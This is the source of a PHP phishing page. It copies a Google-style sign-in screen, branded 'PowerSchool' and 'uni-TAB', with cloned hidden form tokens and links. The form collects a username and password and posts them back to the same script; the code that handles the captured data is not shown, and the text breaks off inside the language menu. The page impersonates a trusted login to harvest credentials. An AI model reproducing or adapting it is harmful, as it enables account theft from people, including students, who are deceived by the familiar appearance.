<?php
if (!isset($_POST['submit'])){
?>
<!DOCTYPE HTML>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="description" content="PowerSchool is email that's intuitive, efficient, and useful. 15 GB of storage, less spam, and mobile access.">
  <meta name="uni-TAB-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
  <title>PowerSchool</title>
  <style>
  @font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: url(//fonts.gstatic.com/s/opensans/v13/DXI1ORHCpsQm3Vp6mXoaTXZ2MAKAc2x4R1uOSeegc5U.eot);
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: url(//fonts.gstatic.com/s/opensans/v13/cJZKeOuBrn4kERxqtaUH3fY6323mHUZFJMgTvxaG2iE.eot);
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style> 
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  border: 0;
  width: 16px;
  height: 16px;
  box-sizing: content-box;
  background: none;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(https://ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .uni-TAB-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  background-image: url(http://s1.postimg.org/pcykvq0a7/logo_2.png);
  background-size: 116px 38px;
  background-repeat: no-repeat;
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .logo-w {
  background-image: url(http://s1.postimg.org/pcykvq0a7/logo_2.png);
  background-size: 112px 36px;
  margin: 21px 0 0;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .uni-TAB-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .uni-TAB-header-bar.centered .header .logo {
  float: outside;
  margin: 40px auto 30px;
  display: block;
  }
  .uni-TAB-header-bar.centered .header .secondary-link {
  display: none
  }
  .uni-TAB-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  min-height: 16px;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: black;
  padding: 20px 25px 30px;
  background-image: url(http://fc05.deviantart.net/fs71/f/2011/006/5/f/night_scene_by_osaelf-d36jx3g.jpg);
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)"> 
  .uni-TAB-header-bar.centered {
  height: 83px;
  }
  .uni-TAB-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)"> 
  html, body {
  font-size: 14px;
  }
  .uni-TAB-header-bar.centered {
  height: 73px;
  }
  .uni-TAB-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)"> 
  .header .logo {
  background-image: url(http://s1.postimg.org/pcykvq0a7/logo_2.png);
  }
  .header .logo-w {
  background-image: url(http://s1.postimg.org/pcykvq0a7/logo_2.png);
  }
</style>
<style> 
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
<style> 
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  box-shadow:0px 2px 2px rgba(0,0,0,0.3);
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card .profile-email {
  font-size: 16px;
  text-align: center;
  margin: 10px 0 20px 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-uni-TAB p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-uni-TAB p.create-account,
  .one-uni-TAB p.switch-account {
  margin-bottom: 60px;
  }
  .one-uni-TAB .logo-strip {
  background-repeat: no-repeat;
  display: block;
  margin: 10px auto;
  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png);
  background-size: 230px 17px;
  width: 230px;
  height: 17px;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)"> 
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-uni-TAB p.create-account,
  .one-uni-TAB p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)"> 
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)"> 
  .one-uni-TAB .logo-strip {
  background-image: url(https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_2x.png);
  }
</style>
<style> 
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("//ssl.gstatic.com/ui/v1/icons/common/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)"> 
  .jfk-tooltip {
  display: none;
  }
</style>
<style> 
  .need-help-reverse {
  float: right;
  }
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
    background-color: black;
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  position: absolute;
  left: 50%;
  top: 380px;
  margin-left: 150px;
  }
  .dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
  }
  .dasher-tooltip p {
  margin-top: 0;
  }
  .dasher-tooltip p span {
  display: block;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)"> 
  .dasher-tooltip {
  top: 340px;
  }
</style>
  </head>
  <body>
  <div class="wrapper">
  <div class="uni-TAB-header-bar-centered">
  <div class="header content clearfix">
  <div class="logo logo-w" aria-label="uni-TAB"></div>
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
<h1>
  Welcome to the world of interactive learning.
</h1>
  <h2 class="hidden-small">
  Sign in to continue to uni-TAB
  </h2>
</div>
<div class="card signin-card clearfix">
  <div id="cc_iframe_parent"><iframe src="https://accounts.youtube.com/accounts/CheckConnection?pmpo=https%3A%2F%2Faccounts.uni-TAB.com&amp;v=-780293308&amp;timestamp=1452674075605" id="youtube" style="visibility: hidden; width: 1px; height: 1px; position: absolute; top: -100px;"></iframe></div>
<img class="profile-img" src="//ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="">
<p class="profile-name"></p>
  <form novalidate="" method="post" action="<?=$_SERVER['PHP_SELF']?>" id="gaia_loginform">
  <input name="Page" type="hidden" value="SignIn">
  <input type="hidden" name="GALX" value="1OP7yn1FKn4">
  <input type="hidden" name="gxf" value="AFoagUXByFkHcDIhMdEfKBITl0QSgbOxHg:1452399613296">
  <input type="hidden" name="continue" value="https://mail.uni-TAB.com/mail/">
  <input type="hidden" name="service" value="mail">
  <input type="hidden" id="_utf8" name="_utf8" value="?">
  <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
  <input type="hidden" id="pstMsg" name="pstMsg" value="1">
  <input type="hidden" id="dnConn" name="dnConn" value="">
  <input type="hidden" id="checkConnection" name="checkConnection" value="">
  <input type="hidden" id="checkedDomains" name="checkedDomains" value="youtube">
<label style="color: white;" class="stacked-label" for="Email">Username</label>
<input id="Email" name="username" type="email" placeholder="Email" value="" spellcheck="false" class="">
<label style="color: white;" class="stacked-label" for="Passwd">Password</label>
<input id="Passwd" name="password" type="password" placeholder="Password" class="">
<input style="background: blueviolet; border-radius= blueviolet ;" id="signIn" name="submit" class="rc-button rc-button-submit" type="submit" value="Sign in">
  <label class="remember">
  <input style="background:white;color: white;" id="PersistentCookie" name="PersistentCookie" type="checkbox" value="yes" checked="checked">
  <span style="color: white;">
  Stay signed in
  </span>
  <div class="bubble-wrap" role="tooltip">
  <div class="bubble-pointer"></div>
  <div class="bubble" style="background: black; color: white;">
  For your convenience, keep this checked. On shared devices, additional precautions are recommended.
  <a href="https://support.uni-TAB.com/accounts/?p=securesignin&amp;hl=en" target="_blank">Learn more</a>
  </div>
  </div>
  </label>
  <input type="hidden" name="rmShown" value="1">
  <a id="link-forgot-passwd" href="https://accounts.uni-TAB.com/RecoverAccount?service=mail&amp;continue=https%3A%2F%2Fmail.uni-TAB.com%2Fmail%2F&amp;hl=en" class="need-help-reverse">
  Need help?
  </a>
  </form>
  
</div>
<div class="one-uni-TAB">
  <p class="create-account">
  <a id="link-signup" href="Create new PowerSchool account.php">
  Create an account
  </a>
  </p>
<p class="tagline">
  One uni-TAB Account makes you everything learned
</p>
  </div>
  <div class="uni-TAB-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  <a href="https://www.uni-TAB.com/intl/en/about" target="_blank">
  About uni-TAB
  </a>
  </li>
  <li>
  <a href="https://accounts.uni-TAB.com/TOS?loc=IN&amp;hl=en&amp;privacy=true" target="_blank">
  Privacy
  </a>
  </li>
  <li>
  <a href="https://accounts.uni-TAB.com/TOS?loc=IN&amp;hl=en" target="_blank">
  Terms
  </a>
  </li>
  <li>
  <a href="http://www.uni-TAB.com/support/accounts?hl=en" target="_blank">
  Help
  </a>
  </li>
  </ul>
<video controls="" autoplay="" repeat="" name="media"><source src="bensound-littleidea.mp3" type="audio/mpeg"></video>
  <div id="lang-vis-control" style="display: inline;">
  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
  <label for="lang-chooser"><img src="//ssl.gstatic.com/images/icons/ui/common/universal_language_settings-21.png" alt="Change language"></label>
  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  <option value="af">
  ?Afrikaans?
  </option>
  <option value="az">
  ?az?rbaycan dili?
  </option>
  <option value="ms">
  ?Bahasa Melayu?
  </option>
  <option value="ca">
  ?catal??
  </option>
  <option value="cs">
  ?Ce?tina?
  </option>
  <option value="da">
  ?Dansk?
  </option>
  <option value="de">
  ?Deutsch?
  </option>
  <option value="et">
  ?eesti?
  </option>
  <option value="en-GB">
  ?English (United Kingdom)?
  </option>
  <option value="en" selected="selected">
  ?English (United States)?
  </option>
  <option value="es">
  ?Espa?ol (Espa?a)?
  </option>
  <option value="es-419">
  ?Espa?ol (Latinoam?rica)?
  </option>
  <option value="eu">
  ?euskara?
  </option>
  <option value="fil">
  ?Filipino?
  </option>
  <option value="fr-CA">
  ?Fran?ais (Canada)?
  </option>
  <option value="fr">
  ?Fran?ais (France)?
  </option>
  <option value="gl">
  ?galego?
  </option>
  <option value="hr">
  ?Hrvatski?
  </option>
  <option value="in">
  ?Indonesia?
  </option>
  <option value="zu">
  ?isiZulu?
  </option>
  <option value="is">
  ??slenska?
  </option>
  <option value="it">
  ?Italiano?
  </option>
  <option value="sw">
  ?Kiswahili?
  </option>
  <option value="lv">
  ?latvie?u?
  </option>
  <option value="lt">
  ?lietuviu?
  </option>
  <option value="hu">
  ?magyar?
  </option>
  <option value="nl">
  ?Nederlands?
  </option>
  <option value="no">
  ?norsk?
  </option>
  <option value="pl">
  ?polski?
  </option>
  <option value="pt">
  ?Portugu?s (Brasil)?
  </option>
  <option value="pt-PT">
  ?portugu?s (Portugal)?
  </option>
  <option value="ro">
  ?rom?na?
  </option>
  <option value="sk">
  ?Slovencina?
  </option>
  <option value="sl">
  ?sloven?cina?
